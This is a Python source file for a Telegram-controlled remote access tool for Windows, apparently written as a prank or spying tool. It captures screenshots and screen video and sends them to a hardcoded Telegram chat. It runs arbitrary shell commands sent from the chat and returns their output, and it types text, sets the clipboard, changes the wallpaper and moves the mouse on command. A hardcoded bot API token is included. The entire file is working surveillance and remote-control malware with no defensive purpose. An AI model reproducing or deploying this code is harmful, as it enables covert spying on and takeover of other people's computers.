import telebot
from threading import Thread
import time
import pyautogui
import os
import getpass
import cv2
import numpy as np
import keyboard
from ctypes  import *
import os
import psutil
import random
import subprocess
import ctypes
import requests
from io import BytesIO
from PIL import Image
import pyperclip

screen_wide = windll.user32.GetSystemMetrics(0)
screen_height = windll.user32.GetSystemMetrics(1)

API_TOKEN = '6568453657:AAER7sALNIJT0Enu_iFtGblNKhxTHV37SzE'

USER_NAME = getpass.getuser()

matthew_id = 496266339
nikita_id = -5515358231

bot = telebot.TeleBot(API_TOKEN,skip_pending = True)

global scr_pause
scr_pause = 0





global screen_recording 
global sreen_recordinc_cycle_
global screen_recording_set_time 
global screen_recording_star_time 

screen_recording = False
sreen_recordinc_cycle_ = False
screen_recording_set_time = 1
screen_recording_star_time = 0

def video_record():
      global screen_recording 
      global sreen_recordinc_cycle_
      global screen_recording_set_time 
      global screen_recording_star_time 
      global screen_recording
      
      # img = pyautogui.screenshot()
      screen_size = (screen_wide,screen_height)
      fourcc = cv2.VideoWriter.fourcc(*'DIVX')
      output = r'C:\Users\Public\Downloads\video.avi'
      FPS = 1.5
      out = cv2.VideoWriter(output,fourcc ,FPS,(screen_size))
      while True:
            out = cv2.VideoWriter(output,fourcc ,FPS,(screen_size))

            while screen_recording:
                  img = pyautogui.screenshot()
                  frame = np.array(img)
                  frame = cv2.cvtColor(frame,cv2.COLOR_BGR2RGB)
                  out.write(frame)
                  #StopIteration(0.5)
                  # cv2.imshow('frame',frame)
                  k = cv2.waitKey(1)
                  if time.time()-screen_recording_star_time>=int(screen_recording_set_time):
                        file = open(output,'rb')
                        bot.send_video(matthew_id,file)
                        print(sreen_recordinc_cycle_)
                        if int(sreen_recordinc_cycle_) == 1:
                              screen_recording_star_time = time.time()
                              out = cv2.VideoWriter(output,fourcc ,FPS,(screen_size))
                              
                        else:
                              screen_recording = False
                              out = cv2.VideoWriter(output,fourcc ,FPS,(screen_size))
            # os.remove(output)
                  
def scd():
      screenshot = pyautogui.screenshot()
      screenshot_path = r'C:\Users\Public\Downloads\screenshot10101.png'
      screenshot.save(screenshot_path)
      photo1= open(screenshot_path,"rb")
      bot.send_document(matthew_id,photo1)
      time.sleep(0.1)
      photo1.close()
      os.remove(screenshot_path)

th2 = Thread(target = video_record)
th2.start()
def scr(delay):
        global scr_pause
        if delay!='':
              scr_pause = delay
        elif delay == '':
              scr_pause = 0      
        screenshot = pyautogui.screenshot()
        screenshot_path = r'C:\Users\Public\Downloads\screenshot10101.png'
        screenshot.save(screenshot_path)
        photo1= open(screenshot_path,"rb")
        bot.send_photo(matthew_id,photo1)
        photo1.close()
        os.remove(screenshot_path)

def th1():
    global scr_pause
    global WRITE_TEXT
    global ALT_TAB
    while(True):
            def WRITE_TEXT(arg):
                   keyboard.write(arg)
            # keyboard = telebot.types.ReplyKeyboardMarkup(True)

            if int(scr_pause) != 0:
                  time.sleep(int(scr_pause))
                  scr(scr_pause)
            def ALT_TAB(): # ага
                  print("PISKAAAAAAAAA")
                  keyboard.press_and_release('alt + tab')

th = Thread(target = th1)
th.start()
global WRITE_TEXT
global ALT_TAB
@bot.message_handler(commands=['start'])
def start_message(message):
    keyboard = telebot.types.ReplyKeyboardMarkup(True)
    keyboard.row('scr', 'scd','rec015','alb')
    bot.send_message(message.chat.id, 'Keyboard Update', reply_markup=keyboard)


def CLIPBOARD(arg): #
    pyperclip.copy(arg)
    

def CMD(arg): 
    command = arg
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True, encoding='cp1251')
        if result.stdout != '':
            output_msg = ("результат операции:")
            output_msg = output_msg+ str(result.stdout)
        else:
            output_msg = ("Ошибка")
    except Exception as e:
        output_msg = (f"Произошла ошибка: {e}")
    bot.send_message(matthew_id,str(output_msg))  


def WALLPAPER(arg): #
    image_url = arg
    get_url = requests.get(image_url)
    image = Image.open(BytesIO(get_url.content))
    image_path = r'C:\Users\Public\Downloads\screenshot10100.png'
    image.save(image_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
    image.close()
    os.remove(image_path)
global MOUSE_CLICK


def th4():
     global MOUSE_CLICK

     while True:
            def MOUSE_CLICK(arg):
             button = arg[:1]
             count = int(arg[1:])+1
             if button == 'r' or button =="R":
                   
                   while int(count):
                        count -= 1
                        pyautogui.rightClick()
                        time.sleep(0.1)
             elif button =="l" or button =="L":
                   
                   while int(count):
                         count -= 1
                         pyautogui.leftClick()
                         time.sleep(0.1)
             count = 0      


the2 = Thread(target = th4)
the2.start()
global MOUSE_SHAKE
def th5():
     global MOUSE_SHAKE
     while True:
             def MOUSE_SHAKE(arg): # 1 ПИКСЕЛИ ху и продолжительность через пробел!!!
                  arg = arg.split(' ')
                  shake_intensity = int(arg[0])
                  shake_duration = int(arg[1])
                  for _ in range(int(shake_duration / 0.01)):
                        x = random.randint(-shake_intensity,shake_intensity)
                        y = random.randint(-shake_intensity,shake_intensity)
                        pyautogui.move(x,y)
                  shake_duration = 0

the3 = Thread(target = th5)
the3.start()

liscommand = [ 'scr','rec','scd','alb', 'cmd', 'wlp',"wrt", "clp","mlc","msh"]

@bot.message_handler()
def receiving_mesage(message):

    global sreen_recordinc_cycle_
    global screen_recording_set_time 
    global screen_recording_star_time 
    global screen_recording
      # img = pyautogui.screen

    # print(message.chat.id)
    if (message.chat.id == matthew_id or message.chat.id == nikita_id) and message.text[:3] in liscommand:
       command = message.text[:3]
       print(command)
       arg = message.text[3:]
       if command == 'scr':
             scr(arg)
       elif command == 'rec':
              screen_recording = not(screen_recording)
              sreen_recordinc_cycle_ =  arg[:1]
              screen_recording_set_time = arg[1:]
              screen_recording_star_time = time.time()
              print("rec")
       elif command == 'scd':
        scd()

       elif command == 'alb':
        print("ALT")
        ALT_TAB()
        
       elif command == 'cmd':
            CMD(arg)
       elif command == 'wlp': 
            WALLPAPER(arg)
       elif command == "wrt":
            WRITE_TEXT(arg)     
       elif command == "clp":
            CLIPBOARD(arg)   
       elif command == "mlc":
            MOUSE_CLICK(arg)
       elif command == "msh":
            MOUSE_SHAKE(arg)




       else:
            print(command+arg) 

       bot.send_message(matthew_id,
f"""получена команда: {command}
аргумент: {arg}""")     
    else:
          bot.send_message(message.chat.id,"who are you?")
          



bot.infinity_polling()
